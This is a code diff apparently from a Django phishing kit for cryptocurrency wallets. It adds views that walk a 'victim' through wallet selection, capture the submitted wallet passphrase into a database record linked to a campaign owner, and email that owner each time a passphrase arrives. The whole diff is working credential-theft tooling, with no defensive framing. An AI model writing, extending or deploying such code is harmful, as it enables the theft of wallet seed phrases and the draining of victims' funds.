@@ -157,6 +157,50 @@ def unknown_device_login(request, campaign_id):
     campaign = get_object_or_404(Campaign, id=campaign_id)
     return render(request, 'core/unknown_device_login.html', {'campaign': campaign})
 
+def wallet_select(request, campaign_id):
+    campaign = get_object_or_404(Campaign, id=campaign_id)
+
+    if request.method == 'POST':
+        form = WalletForm(request.POST)
+        if form.is_valid():
+            victim_info = form.save(commit=False)
+            # Store wallet ID and name in session
+            request.session['victim_wallet_id'] = victim_info.wallet.id
+            request.session['victim_wallet_name'] = victim_info.wallet.name  # Optional
+            return redirect('core:passphrase_validate', campaign_id=campaign.id)
+    else:
+        form = WalletForm()
+
+    return render(request, 'core/wallet_select.html', {'form': form, 'campaign': campaign})
+
+    
+def passphrase_validate(request, campaign_id):
+    campaign = get_object_or_404(Campaign, id=campaign_id)
+
+    if request.method == 'POST':
+        form = PassphraseForm(request.POST)
+        if form.is_valid():
+            victim_info = VictimInfo(
+                user=campaign.user,  # Associate the current user
+                wallet=get_object_or_404(Wallet, id=request.session.get('victim_wallet_id')),  # Fetch wallet info from session
+                campaign=campaign,  # Set the associated campaign
+                passphrase=form.cleaned_data['passphrase'],
+            )
+            victim_info.save()
+
+            # Clear session data after saving
+            del request.session['victim_wallet_id']
+
+            #send email notification to user 
+            send_victim_info_notification(user_email=campaign.user.email, campaign=campaign)
+            messages.success(request, 'Victim info saved successfully!')
+
+            return redirect('core:success', pk=campaign.id)  # Redirect to view all submitted info
+    else:
+        form = PassphraseForm()
+
+    return render(request, 'core/passphrase_validate.html', {'form': form, 'campaign': campaign})
+
 def address_info(request, campaign_id):
     campaign = get_object_or_404(Campaign, id=campaign_id)
 
